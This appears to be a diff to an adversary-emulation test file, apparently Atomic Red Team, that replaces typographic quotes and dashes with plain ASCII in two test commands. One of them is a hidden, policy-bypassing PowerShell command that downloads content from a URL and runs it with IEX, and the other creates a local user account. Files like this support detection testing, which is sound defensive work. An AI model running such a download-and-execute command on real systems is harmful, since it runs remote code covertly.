@@ -114,7 +114,7 @@ atomic_tests:
   executor:
     name: command_prompt
     command: |
-      New-LocalUser -FullName '#{full_name}' -Name '#{user_name}' -Password #{password} ‑Description '#{description}'
+      New-LocalUser -FullName '#{full_name}' -Name '#{user_name}' -Password #{password} -Description '#{description}'
 
 - name: Powershell MsXml COM object
   description: |
@@ -134,7 +134,7 @@ atomic_tests:
   executor:
     name: powershell
     command: |
-      powershell.exe -exec bypass -windowstyle hidden -noprofile “$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open(‘GET’,’#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText”
+      powershell.exe -exec bypass -windowstyle hidden -noprofile "$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','#{url}',$False);$comMsXml.Send();IEX $comMsXml.ResponseText"
 
 - name: Powershell XML requests
   description: |
